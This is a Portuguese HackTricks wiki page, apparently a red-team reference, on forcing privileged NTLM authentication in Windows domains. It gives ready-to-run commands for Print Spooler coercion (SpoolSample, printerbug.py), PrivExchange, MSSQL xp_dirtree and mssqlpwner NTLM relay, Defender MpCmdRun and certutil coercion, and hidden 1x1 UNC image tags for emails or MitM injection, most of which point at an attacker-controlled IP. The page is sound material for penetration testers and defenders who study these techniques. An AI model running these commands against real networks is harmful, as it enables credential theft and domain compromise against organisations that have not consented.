# Forçar Autenticação Privilegiada NTLM

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **gatilhos de autenticação remota** codificados em C# usando o compilador MIDL para evitar dependências de terceiros.

## Abuso do Serviço de Spooler

Se o _**Serviço de Spooler de Impressão**_ estiver **ativado**, você pode usar algumas credenciais de AD já conhecidas para **solicitar** ao servidor de impressão do Controlador de Domínio uma **atualização** sobre novos trabalhos de impressão e apenas dizer para **enviar a notificação para algum sistema**.\
Observe que, quando a impressora envia a notificação para sistemas arbitrários, ela precisa **se autenticar contra** esse **sistema**. Portanto, um atacante pode fazer o _**Serviço de Spooler de Impressão**_ se autenticar contra um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.

### Encontrando Servidores Windows no domínio

Usando PowerShell, obtenha uma lista de máquinas Windows. Servidores geralmente têm prioridade, então vamos focar lá:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando serviços de Spooler escutando

Usando uma versão ligeiramente modificada do @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), veja se o Serviço de Spooler está escutando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Peça ao serviço para autenticar contra um host arbitrário

Você pode compilar[ **SpoolSample daqui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se você estiver no Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando com Delegação Incontrolada

Se um atacante já comprometeu um computador com [Delegação Incontrolada](unconstrained-delegation.md), o atacante poderia **fazer a impressora se autenticar contra este computador**. Devido à delegação incontrolada, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação incontrolada. Como o atacante já comprometeu este host, ele poderá **recuperar este ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).

## Autenticação Forçada RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

O ataque `PrivExchange` é resultado de uma falha encontrada na **funcionalidade `PushSubscription` do Exchange Server**. Esta funcionalidade permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a se autenticar em qualquer host fornecido pelo cliente via HTTP.

Por padrão, o **serviço Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl na atualização cumulativa do domínio anterior a 2019**). Esta falha pode ser explorada para habilitar o **encaminhamento de informações para LDAP e, subsequentemente, extrair o banco de dados NTDS do domínio**. Em casos onde o encaminhamento para LDAP não é possível, esta falha ainda pode ser usada para encaminhar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Admin do Domínio com qualquer conta de usuário autenticada do domínio.

## Dentro do Windows

Se você já estiver dentro da máquina Windows, pode forçar o Windows a se conectar a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou use esta outra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar certutil.exe lolbin (binário assinado pela Microsoft) para forçar a autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se você souber o **endereço de e-mail** do usuário que faz login em uma máquina que você deseja comprometer, você pode simplesmente enviar a ele um **e-mail com uma imagem 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando ele o abrir, ele tentará se autenticar.

### MitM

Se você puder realizar um ataque MitM a um computador e injetar HTML em uma página que ele visualizar, você pode tentar injetar uma imagem como a seguinte na página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Quebrando NTLMv1

Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emember que para quebrar NTLMv1 você precisa definir o desafio do Responder como "1122334455667788"_

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
